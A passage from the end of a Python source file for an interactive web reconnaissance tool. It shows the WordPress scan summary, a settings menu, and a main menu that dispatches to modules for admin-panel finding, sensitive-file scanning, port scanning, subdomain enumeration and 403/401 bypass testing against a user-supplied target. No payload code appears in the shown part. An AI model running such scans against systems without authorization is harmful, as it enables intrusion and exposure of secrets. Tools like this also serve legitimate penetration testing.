                    print(f"  {sev_col}[{v['severity']}]{C.E}  {C.BOLD}{v['id']}{C.E}  {C.Y}{v['type']}{C.E}")
                    print(f"    {C.DIM}{v['desc']}{C.E}")
                    if "check_url" in v:
                        print(f"    {C.G}Test endpoint: {self.url}{v['check_url']}{C.E}")
                    print()
                self.findings.extend(version_vulns)
            else:
                cprint(C.G, f"  [✔] No known CVEs found for WordPress {version} in database")
        else:
            sep("5. CVE DATABASE")
            cprint(C.Y, "  [?] Skipped — version unknown")

        # ── Summary ───────────────────────────────────────────────────
        sep("WORDPRESS SCAN SUMMARY")
        total_critical = sum(1 for f in self.findings if f.get("severity") == "Critical")
        total_high     = sum(1 for f in self.findings if f.get("severity") == "High")
        total_medium   = sum(1 for f in self.findings if f.get("severity") == "Medium")
        total_low      = sum(1 for f in self.findings if f.get("severity") == "Low")
        print(f"  {C.CY}Version    :{C.E}  {version or 'Unknown'}")
        print(f"  {C.CY}Users Found:{C.E}  {len(users)}  {C.DIM}({', '.join(users[:5])}){C.E}")
        print(f"  {C.CY}Plugins    :{C.E}  {len(found_plugins)} detected")
        print(f"  {C.R}Critical   :{C.E}  {total_critical}")
        print(f"  {C.M}High       :{C.E}  {total_high}")
        print(f"  {C.Y}Medium     :{C.E}  {total_medium}")
        print(f"  {C.G}Low        :{C.E}  {total_low}")

        cprint(C.G, f"\n[✔] WordPress Scanner: {len(self.findings)} findings")

        result = {
            "version": version,
            "users": users,
            "plugins": found_plugins,
            "findings": self.findings,
        }
        self.logger.save("wordpress_scanner", result)
        return result

# ═════════════
#  SETTINGS
# ═════════════
class Settings:
    def __init__(self):
        self.proxy   = None
        self.timeout = Config.TIMEOUT
        self.threads = Config.THREADS
        self.delay   = Config.DELAY

    def menu(self):
        while True:
            sep("SETTINGS")
            print(f"  1. Proxy    : {C.CY}{self.proxy or 'disabled'}{C.E}")
            print(f"  2. Timeout  : {C.CY}{self.timeout}s{C.E}")
            print(f"  3. Threads  : {C.CY}{self.threads}{C.E}")
            print(f"  4. Delay    : {C.CY}{self.delay}s{C.E}")
            print(f"  0. Back")
            ch = ask("Choice","0")
            if ch=='1':
                v = ask("Proxy URL (e.g. http://127.0.0.1:8080) or blank:")
                self.proxy = v or None
            elif ch=='2':
                v = ask("Timeout (seconds) [8]:", "8")
                if v.isdigit(): self.timeout = int(v)
            elif ch=='3':
                v = ask("Threads [40]:", "40")
                if v.isdigit(): self.threads = max(1,min(200,int(v)))
            elif ch=='4':
                try: self.delay = float(ask("Delay between requests [0]:", "0"))
                except: pass
            elif ch=='0': break

    def engine(self) -> Engine:
        return Engine(proxy=self.proxy, timeout=self.timeout,
                      delay=self.delay, threads=self.threads)


# ═════════════
#  MAIN
# ═════════════
def get_url() -> str:
    while True:
        url = ask("Target URL (https://example.com):")
        if url.startswith('http://') or url.startswith('https://'):
            return url
        cprint(C.R, "  [!] Must start with http:// or https://")

def menu_line(n, label):
    print(f"  {C.CY}{n}{C.E}  {label}")

def main():
    clear()
    banner()

    cfg = Settings()
    target = get_url()
    log = Logger(target)
    cprint(C.G, f"\n  [✔] Target : {target}")
    cprint(C.G, f"  [✔] Log    : {log.txt}")

    # ── Initial tech detection (once per target) ──
    eng0 = cfg.engine()
    tech = TechDetector(target, eng0, log)
    tech_info = tech.run()
    detected_cats = tech.relevant_categories()
    if detected_cats:
        cprint(C.CY, f"\n  [i] Tech-aware categories will be prioritised for admin/sensitive scans.")

    while True:
        sep("MENU")
        menu_line("1", "Information Gathering")
        menu_line("2", "Admin Panel Finder  (login panels only, tech-aware)")
        menu_line("3", "Web Crawler  +  Bug-Hunt URL Extractor")
        menu_line("4", "Sensitive File Scanner  (files/configs/backups/keys)")
        menu_line("5", "Port Scanner")
        menu_line("6", "Subdomain Enumerator")
        menu_line("7", "403 / 401 Bypass Tester")
        menu_line("8", "WordPress Scanner  (version, CVEs, user enum, plugins)")
        menu_line("9", "Full Scan  (all modules)")
        menu_line("S", "Settings")
        menu_line("T", "Change Target")
        menu_line("0", "Exit")
        print(f"\n  {C.DIM}Target: {target}  |  Threads: {cfg.threads}  |  Proxy: {cfg.proxy or 'off'}{C.E}")
        if tech_info.get("cms"):
            cms_names = [c["name"] for c in tech_info["cms"]]
            print(f"  {C.DIM}Detected: {', '.join(cms_names)}{C.E}")

        ch = ask("Choice:").upper()
        eng = cfg.engine()

        if ch == '1':
            InfoGatherer(target, eng, log).run()
            done_prompt()

        elif ch == '2':
            # Show tech-aware categories first
            cats = list(ADMIN_PATHS.keys())
            print(f"\n  {C.Y}Categories:{C.E}")
            print(f"  {C.DIM}[Auto] Recommended for detected tech: {', '.join(detected_cats[:8])}...{C.E}")
            for i,c in enumerate(cats,1):
                print(f"  {C.CY}{i}{C.E}  {c}  ({len(ADMIN_PATHS[c])})")
            print(f"  {C.CY}A{C.E}  All")
            sel = ask("Select (e.g. 1,3 or A):", "A").upper()
            if sel=='A':
                selected = cats
            else:
                selected = []
                for p in sel.split(','):
                    p=p.strip()
                    if p.isdigit():
                        idx=int(p)-1
                        if 0<=idx<len(cats): selected.append(cats[idx])
            if not selected: selected = cats

            ans = ask("Quick port probe first to catch panels on live mgmt ports? [Y/n]:", "y").lower()
            open_ports = []
            if ans == 'y':
                mgmt_ports = list(MANAGEMENT_PORT_PROBE.keys())
                ps = PortScanner(target, log, threads=len(mgmt_ports))
                open_ports = ps.run(custom_ports=mgmt_ports)

            AdminFinder(target, eng, log, categories=selected,
                        open_ports=open_ports).run()
            log.save("admin_finder_final", True)
            done_prompt()

        elif ch == '3':
            try:
                d = int(ask("Crawl depth [2]:", "2"))
            except: d=2
            WebCrawler(target, eng, log, max_depth=d).run()
            log.finalize()
            done_prompt()

        elif ch == '4':
            SensitiveScanner(target, eng, log,
                             tech_cats=[c["name"] for c in tech_info.get("cms", [])]
                             ).run()
            log.finalize()
            done_prompt()

        elif ch == '5':
            print(f"\n  {C.Y}Port Scan Mode:{C.E}")
            print(f"  1  Common ports ({len(PortScanner.COMMON_PORTS)})")
            print(f"  2  Range")
            print(f"  3  Custom list")
            pm = ask("Mode [1]:", "1")
            ps = PortScanner(target, log)
            if pm=='2':
                try:
                    start = int(ask("Start port [1]:", "1"))
                    end   = int(ask("End port [65535]:", "65535"))
                    threads_p = int(ask("Threads [150]:", "150"))
                    ps.threads = threads_p
                    ps.run(port_range=(start,end))
                except: ps.run()
            elif pm=='3':
                raw = ask("Ports (comma-separated, e.g. 22,80,443,8080):")
                try:
                    ports = [int(x.strip()) for x in raw.split(',') if x.strip().isdigit()]
                    ps.run(custom_ports=ports)
                except: ps.run()
            else:
                ps.run()
            done_prompt()

        elif ch == '6':
            SubdomainEnum(target, log).run()
            log.finalize()
            done_prompt()

        elif ch == '7':
            path = ask("Path to bypass (e.g. /admin):", "/admin")
            BypassTester(target, path, log).run()
            log.finalize()
            done_prompt()

        elif ch == '8':
            WordPressScanner(target, eng, log).run()
            log.finalize()
            done_prompt()

        elif ch == '9':
            cprint(C.M, "\n  ══ FULL SCAN ══")
            # Refresh tech detection
            tech = TechDetector(target, eng, log)
            tech_info = tech.run()
            detected_cats = tech.relevant_categories()

            InfoGatherer(target, eng, log).run()

            open_ports = PortScanner(target, log).run()

            AdminFinder(target, eng, log, open_ports=open_ports,
                        tech_cats=detected_cats).run()

            try: d = int(ask("Crawl depth [2]:", "2"))
            except: d=2
            WebCrawler(target, eng, log, max_depth=d).run()

            SensitiveScanner(target, eng, log,
                             tech_cats=[c["name"] for c in tech_info.get("cms", [])]
                             ).run()

            # Run WordPress scanner if WP detected
            cms_names = [c["name"] for c in tech_info.get("cms", [])]
            if "WordPress" in cms_names:
                WordPressScanner(target, eng, log).run()

            SubdomainEnum(target, log).run()

            log.finalize()
            cprint(C.G, "\n  [✔] Full Scan Complete!")
            done_prompt()

        elif ch == 'S':
            cfg.menu()

        elif ch == 'T':
            target = get_url()
            log    = Logger(target)
            eng0   = cfg.engine()
            tech   = TechDetector(target, eng0, log)
            tech_info = tech.run()
            detected_cats = tech.relevant_categories()
            cprint(C.G, f"  [✔] Target updated: {target}")

        elif ch == '0':
            log.finalize()
            cprint(C.CY, "\n  Goodbye.\n")
            sys.exit(0)
        else:
            cprint(C.R, "  [!] Invalid choice")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.Y}  [!] Interrupted.{C.E}\n")
        sys.exit(0)
